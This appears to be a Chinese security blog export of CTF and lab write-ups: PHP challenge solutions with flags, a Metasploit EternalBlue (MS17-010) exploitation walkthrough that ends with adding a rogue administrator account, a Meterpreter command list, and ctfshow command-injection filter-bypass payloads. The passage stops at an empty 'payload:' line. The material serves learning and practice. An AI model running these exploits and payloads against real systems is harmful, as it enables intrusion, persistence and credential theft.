class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/m0_51683653/article/details/128839648">https://blog.csdn.net/m0_51683653/article/details/128839648</a></p>
<p>cyberpeace{e8b0e794a7cc1f5d75bae6b3868d77db}</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);   <span class="comment">//字符串反转</span></span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>; <span class="comment">//ord() 函数返回字符串中第一个字符的 ASCII 值</span></span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);<span class="comment">//chr() 函数从指定 ASCII 值返回字符。并可以指定ASCII是十进制或是十六进制或是八进制。</span></span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   <span class="comment">// “.” 是字符运算符，作用是把两个字符串连接起来，</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*str_rot13() 函数对字符串执行 ROT13 编码。</span></span><br><span class="line"><span class="comment">ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>​      substr()</p>
<table>
<thead>
<tr>
<th><em>string</em></th>
<th>必需。规定要返回其中一部分的字符串。</th>
</tr>
</thead>
<tbody><tr>
<td><em>start</em></td>
<td>必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾开始的指定位置开始0 - 在字符串中的第一个字符处开始</td>
</tr>
<tr>
<td><em>length</em></td>
<td>可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数 - 从 <em>start</em> 参数所在的位置返回的长度负数 - 从字符串末端返回的长度</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str=&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;;</span><br><span class="line">$_ = base64_decode(strrev(str_rot13($str)));</span><br><span class="line">$_o=NULL;</span><br><span class="line">for($_0=0;$_0&lt;strlen($_);$_0++)&#123;    </span><br><span class="line">        $_c=substr($_,$_0,1);  </span><br><span class="line">        $__=ord($_c)-1;  </span><br><span class="line">        $_c=chr($__);  </span><br><span class="line">        $_o=$_o.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">echo strrev($_o);//先反转，所以解密最后反转</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}</p>
]]></content>
      <categories>
        <category>攻防世界</category>
      </categories>
      <tags>
        <tag>攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title>永恒之蓝漏洞复现</title>
    <url>/2023/04/12/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>  学习一下msf</p>
<p>​    <span id="more"></span></p>
<p>windos7镜像下载</p>
<p><a href="https://www.imsdn.cn/windows-server/windows-server-2008-r2/">Windows Server 2008 R2 ISO镜像下载 - 我的MSDN (imsdn.cn)</a></p>
<p>1.启动msf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p>2.搜索可以用的模板</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>

<ol start="3">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 3   #使用auxiliary/scanner/smb/smb_ms17_010  进行扫描是否存在MS17-010漏洞</span><br><span class="line">show options   #查看需要设置的参数</span><br><span class="line">set rhosts 192.168.158.150</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/12/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/QQ%E6%88%AA%E5%9B%BE20230412145641.png"></p>
<p><img src="/2023/04/12/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/QQ%E6%88%AA%E5%9B%BE20230412145859.png"></p>
<p>若存在如上图所示</p>
<ol start="4">
<li></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use 0 #exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码</span><br><span class="line">show options   #查看需要设置的参数</span><br><span class="line">set rhosts 192.168.158.150 </span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>攻击完成</p>
<p>5.显示   win  字样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell    #进入命令行</span><br><span class="line">chcp 65001    ##切换编码，解决乱码问题</span><br><span class="line">exit   #离开shell</span><br><span class="line">background #把我们获得的meterpreter会话挂载到后台运行</span><br><span class="line">sessions   #显示所有会话</span><br><span class="line">sessions id   #进入会话</span><br></pre></td></tr></table></figure>



<ol start="6">
<li></li>
</ol>
<p>1、创建新用户 ，语法：net user 用户名 密码 &#x2F;add</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user sss @123qwe /add</span><br><span class="line">net localgroup administrators sss /add  #将用户sss添加至管理员组</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Meterpreter &gt; ?</span><br><span class="line">==========================================</span><br><span class="line">核心命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">?                             帮助菜单</span><br><span class="line">background                    把当前会话挂到后台运行</span><br><span class="line">bg                            background命令的别名</span><br><span class="line">bgkill                        杀死后台meterpreter 脚本</span><br><span class="line">bglist                        列出正在运行的后台脚本</span><br><span class="line">bgrun                         执行一个meterpreter脚本作为后台线程</span><br><span class="line">channel                       显示信息或控制活动频道</span><br><span class="line">close                         关闭一个频道</span><br><span class="line">detach                        分离Meterpreter会话（用于 http/https）</span><br><span class="line">disable_unicode_encoding      禁用 unicode 字符串的编码</span><br><span class="line">enable_unicode_encoding       启用 unicode 字符串的编码</span><br><span class="line">exit                          终止 Meterpreter 会话</span><br><span class="line">get_timeouts                  获取当前会话超时值</span><br><span class="line">guid                          获取会话 GUID</span><br><span class="line">help                          帮助菜单</span><br><span class="line">info                          显示有关 Post 模块的信息</span><br><span class="line">irb                           在当前会话中打开一个交互式 Ruby shell</span><br><span class="line">load                          加载一个或多个 Meterpreter 扩展</span><br><span class="line">machine_id                    获取连接到会话的机器的 MSF ID</span><br><span class="line">migrate                       将服务器迁移到另一个进程</span><br><span class="line">pivot                         管理枢轴侦听器</span><br><span class="line">pry                           在当前会话上打开 Pry 调试器</span><br><span class="line">quit                          终止 Meterpreter 会话</span><br><span class="line">read                          从通道读取数据</span><br><span class="line">resource                      运行存储在文件中的命令</span><br><span class="line">run                           执行一个 Meterpreter 脚本或 Post 模块</span><br><span class="line">secure                       （重新）协商会话上的 TLV 数据包加密</span><br><span class="line">sessions                      快速切换到另一个会话</span><br><span class="line">set_timeouts                  设置当前会话超时值</span><br><span class="line">sleep                         强制 Meterpreter 安静，然后重新建立会话</span><br><span class="line">ssl_verify                    修改 SSL 证书验证设置</span><br><span class="line">transport                     管理运输机制</span><br><span class="line">use                           不推荐使用的load命令别名</span><br><span class="line">uuid                          获取当前会话的 UUID</span><br><span class="line">write                         将数据写入通道</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：文件系统命令</span><br><span class="line">==========================================</span><br><span class="line"></span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">cat                           将文件内容读到屏幕上</span><br><span class="line">cd                            切换目录</span><br><span class="line">checksum                      检索文件的校验和</span><br><span class="line">cp                            将源复制到目标</span><br><span class="line">del                           删除指定文件</span><br><span class="line">dir                           列出文件（ls 的别名）</span><br><span class="line">download                      下载文件或目录</span><br><span class="line">edit                          编辑文件</span><br><span class="line">getlwd                        打印本地工作目录</span><br><span class="line">getwd                         打印工作目录</span><br><span class="line">lcd                           更改本地工作目录</span><br><span class="line">lls                           列出本地文件</span><br><span class="line">lpwd                          打印本地工作目录</span><br><span class="line">ls                            列出文件</span><br><span class="line">mkdir                         制作目录</span><br><span class="line">mv                            将源移动到目标</span><br><span class="line">pwd                           打印工作目录</span><br><span class="line">rm                            删除指定文件</span><br><span class="line">rmdir                         删除目录</span><br><span class="line">search                        搜索文件</span><br><span class="line">show_mount                    列出所有挂载点/逻辑驱动器</span><br><span class="line">upload                        上传文件或目录</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">arp                           显示主机 ARP 缓存</span><br><span class="line">getproxy                      显示当前代理配置</span><br><span class="line">ifconfig                      显示界面</span><br><span class="line">ipconfig                      显示接口</span><br><span class="line">netstat                       显示网络连接</span><br><span class="line">portfwd                       将本地端口转发到远程服务</span><br><span class="line">resolve                       解析目标上的一组主机名</span><br><span class="line">route                         查看和修改路由表</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：系统命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">clearev                       清除事件日志</span><br><span class="line">drop_token                    放弃任何活动的模拟令牌。</span><br><span class="line">execute                       执行命令</span><br><span class="line">getenv                        获取一个或多个环境变量值</span><br><span class="line">getpid                        获取当前进程标识符</span><br><span class="line">getprivs                      尝试启用当前进程可用的所有权限</span><br><span class="line">getid                         获取服务器运行的用户的 SID</span><br><span class="line">getuid                        获取服务器运行的用户</span><br><span class="line">kill                          终止进程</span><br><span class="line">localtime                     显示目标系统本地日期和时间</span><br><span class="line">pgrep                         按名称过滤进程</span><br><span class="line">pkill                         按名称终止进程</span><br><span class="line">ps                            列出正在运行的进程</span><br><span class="line">reboot                        重启远程计算机</span><br><span class="line">reg                           修改远程注册表并与之交互</span><br><span class="line">rev2self                      在远程机器上调用 RevertToSelf()</span><br><span class="line">shell                         放入系统命令 shell</span><br><span class="line">shutdown                      关闭远程计算机</span><br><span class="line">steal_token                   尝试从目标进程窃取模拟令牌</span><br><span class="line">suspend                       暂停或恢复进程列表</span><br><span class="line">sysinfo                       获取有关远程系统的信息，例如 OS</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：用户界面命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">enumdesktops                  列出所有可访问的桌面和窗口站</span><br><span class="line">getdesktop                    获取当前的meterpreter桌面</span><br><span class="line">idletime                      返回远程用户空闲的秒数</span><br><span class="line">keyboard_send                 发送击键</span><br><span class="line">keyevent                      发送按键事件</span><br><span class="line">keyscan_dump                  转储击键缓冲区</span><br><span class="line">keyscan_start                 开始捕获击键</span><br><span class="line">keyscan_stop                  停止捕获击键</span><br><span class="line">mouse                         发送鼠标事件</span><br><span class="line">screenshare                   实时观看远程用户桌面</span><br><span class="line">screenshot                    抓取交互式桌面的截图</span><br><span class="line">setdesktop                    更改meterpreters当前桌面</span><br><span class="line">uictl                         控制一些用户界面组件</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：网络摄像头命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">record_mic                    从默认麦克风录制音频 X 秒</span><br><span class="line">webcam_chat                   开始视频聊天</span><br><span class="line">webcam_list                   列出网络摄像头</span><br><span class="line">webcam_snap                   从指定的网络摄像头拍摄快照</span><br><span class="line">webcam_stream                 从指定的网络摄像头播放视频流</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Stdapi：音频输出命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">play                          在目标系统上播放波形音频文件 (.wav)</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：权限提升命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">getsystem                     尝试将您的权限提升到本地系统的权限。</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：密码数据库命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">hashdump                      转储 SAM 数据库的内容</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line">Priv：Timestomp 命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">timestomp                     操作文件 MACE 属性</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/weixin_45588247/article/details/119614618">(4条消息) 【工具使用】——Metasploit(MSF)使用详解(超详细)_metasploit使用教程_剑客 getshell的博客-CSDN博客</a></p>
]]></content>
  </entry>
  <entry>
    <title>极限命令执行</title>
    <url>/2023/04/08/%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p>​     ctfshow 极限命令执行</p>
<p>又学习到好多姿势</p>
<span id="more"></span>

<h2 id="极限命令执行1"><a href="#极限命令执行1" class="headerlink" title="极限命令执行1"></a>极限命令执行1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span><br><span class="line">//flag在根目录flag里，或者直接运行根目录getflag</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    if (!preg_match(&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;,$ctfshow))&#123;</span><br><span class="line">            system($ctfshow);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo(&quot;????????&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>fuzz一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$a</span> = <span class="number">0</span>; <span class="variable">$a</span> &lt; <span class="number">256</span>; <span class="variable">$a</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$a</span>)) . <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//+ ! $ &#x27; ( ) , . / 0 1 2 3 4 5 6 7 8 9 = ? \ a ~</span></span><br></pre></td></tr></table></figure>

<p>题目给了提示：<strong>本套题目运行环境均为CENTOS7</strong></p>
<p>但是这是根据wp的，我本地centos7无法执行&#x2F;getflag</p>
<p>解法一</p>
<p>&#x2F;getflag</p>
<p>给出payload: ctf_show&#x3D;&#x2F;?????a?</p>
<p>解法二： &#x2F;bin&#x2F;base64 &#x2F;flag</p>
<p> payload: ctf_show&#x3D;&#x2F;???&#x2F;?a??64 &#x2F;??a?</p>
<p>解法三</p>
<p>ctf_show&#x3D;&#x2F;bin&#x2F;bash &#x2F;flag</p>
<p>payload： ctf_show&#x3D;&#x2F;???&#x2F;?a?? &#x2F;??a?</p>
<h2 id="极限命令执行2"><a href="#极限命令执行2" class="headerlink" title="极限命令执行2"></a>极限命令执行2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>bp fuzz一下</p>
<p><img src="/2023/04/08/%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230411135838.png"></p>
<p><img src="/2023/04/08/%E6%9E%81%E9%99%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/QQ%E6%88%AA%E5%9B%BE20230411135932.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">str</span>= <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;ctf_show&#x27;</span>:<span class="built_in">chr</span>(i)&#125;</span><br><span class="line">    retext = requests.post(url,data=data).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;??????&quot;</span> <span class="keyword">in</span> retext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(i)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>

<p>python fuzz脚本</p>
<p>payload： &#x2F;getflag</p>
<p>但是我在centos7上试了试并没有成功</p>
<p>同样，其他实验结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\154\163&#x27; #ls 成功</span><br><span class="line">$&#x27;\57\146\154\141\147&#x27;        # /flag   成功</span><br><span class="line">$&#x27;\57\147\145\164\146\154\141\147&#x27; # /getflag 失败</span><br><span class="line">$&#x27;\164\141\143\40\57\146\154\141\147&#x27; #/tac /flag 失败</span><br><span class="line">报错内容bash: tac /flag: 没有那个文件或目录</span><br></pre></td></tr></table></figure>

<p>能解出题目的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$&#x27;\57\147\145\164\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="极限命令执行3"><a href="#极限命令执行3" class="headerlink" title="极限命令执行3"></a>极限命令执行3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!#$&amp;&#x27;()01&lt;\_&#123;&#125;~</span><br></pre></td></tr></table></figure>

<p>在linux 中，</p>
<p>单引号’’，双引号””的区别是</p>
<p>单引号’’剥夺了所有字符的特殊含义，单引号’’内就变成了单纯的字符，。</p>
<p>双引号””则对于双引号””内的参数替换($)和命令替换(&#96;&#96;)是个例外。</p>
<p>比如说 n&#x3D;3</p>
<p>echo ‘$n’</p>
<p>结果就是$n</p>
<p>改成双引号 echo “$n”，结果就是3</p>
<p>[(9条消息) linux中单引号‘ ,双引号“, 反引号 <code> </code>, $, $(), ${}与变量_linux单引号中引用变量_TGAO的博客-CSDN博客](<a href="https://blog.csdn.net/qq_40491569/article/details/83688652#:~:text=%E5%8D%95%E5%BC%95%E5%8F%B7">https://blog.csdn.net/qq_40491569/article/details/83688652#:~:text=单引号</a> ：不进行转译和获取 变量 ，输出原字符串 echo ‘date’ date 双引号,Dec 29 10%3A33%3A40 CST 2020 echo date date)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( ))属于执行计算公式，等价于$[ ]，$( )和` `属于命令替换，$&#123; &#125;属于变量替换</span><br></pre></td></tr></table></figure>

<p>bash里二进制可表示为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((2#100))</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p> 但是由于把2过滤了，所以使用位运算符号构造出2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((1&lt;&lt;1))</span><br><span class="line">2</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&lt;&lt;三个小于号(here-strings)，语法：command [args] &lt;&lt;&lt;[&quot;]$word[&quot;]；$word会展开并作为command的stdin</span><br></pre></td></tr></table></figure>

<p>解析一次后cat &#x2F;flag 为字符串</p>
<p>空格并没有被解析</p>
<p>使用两次here-strings，使其成为标准输入去执行这个复杂命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#111001))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="极限命令执行4"><a href="#极限命令执行4" class="headerlink" title="极限命令执行4"></a>极限命令执行4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span><br><span class="line">//flag在根目录flag里</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;ctf_show&#x27;])) &#123;</span><br><span class="line">    $ctfshow = $_POST[&#x27;ctf_show&#x27;];</span><br><span class="line">    check($ctfshow);</span><br><span class="line">    system($ctfshow);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>fuzz 一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span><br><span class="line"> </span><br><span class="line">str= &quot;&quot;</span><br><span class="line">for i in range(255):</span><br><span class="line">    data = &#123;&#x27;ctf_show&#x27;:chr(i)&#125;</span><br><span class="line">    retext = requests.post(url,data=data).text</span><br><span class="line">    if &quot;??????&quot; in retext:</span><br><span class="line">        print(1)</span><br><span class="line">    else:</span><br><span class="line">        str += chr(i)</span><br><span class="line"> </span><br><span class="line">print(str)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!#$&amp;&#x27;()0&lt;\_&#123;&#125;~</span><br></pre></td></tr></table></figure>

<p>1没了构造1,$: 第一个#是计算字符长度，第二个#是字符串的名字。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $&#123;##&#125;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>payload：</p>
